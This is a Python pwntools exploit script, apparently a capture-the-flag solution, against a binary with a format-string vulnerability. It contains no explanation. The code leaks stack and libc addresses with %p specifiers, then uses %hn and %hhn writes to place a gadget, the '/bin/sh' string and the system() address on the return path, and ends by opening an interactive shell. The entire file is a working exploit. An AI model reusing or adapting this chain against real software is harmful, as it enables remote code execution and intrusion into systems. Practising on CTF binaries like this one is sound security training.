from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0xb27)
''')
sla(b'name:', b'st0ne')
payload = b'%11$p'
sla(b'food: ', payload)
ru(b'like ')
rsp = int(ru(b'!?')[:-2], 16) - 248
i = rsp + 4
i_off = i & 0xffff
pr('i_off', i_off)
payload = b'%' + str(i_off).encode() + b'c%11$hn'
sla(b'food: ', payload)
payload = b'%' + str(40).encode() + b'c%37$hhn'
sla(b'food: ', payload)

payload = b'%9$p'
sla(b'food: ', payload)
ru(b'like ')
libc.address = int(ru(b'!?')[:-2], 16) - 240 - libc.sym['__libc_start_main']
pr('libc_base', libc.address)

def overlap(dest, ptr, off1, off2):
    d = dest & 0xff
    for i in range(8):
        if not ptr:
            break
        payload = b'%' + str(d).encode() + b'c%' + str(off1).encode() + b'$hhn'
        sla(b'food: ', payload)
        f = ptr & 0xff
        payload = b'%' + str(f).encode() + b'c%' + str(off2).encode() + b'$hhn'
        sla(b'food: ', payload)
        d += 1
        ptr >>= 8


ret = rsp + 0x18
ptr = libc.address + 0x21112

payload = b'%' + str(ret & 0xffff).encode() + b'c%25$hn'
sla(b'food: ', payload)

overlap(ret, ptr, 25, 39)
overlap(ret + 8, next(libc.search(b'/bin/sh\x00')), 25, 39)
overlap(ret + 16, libc.sym["system"], 25, 39)

sla(b'food', payload)

shell()
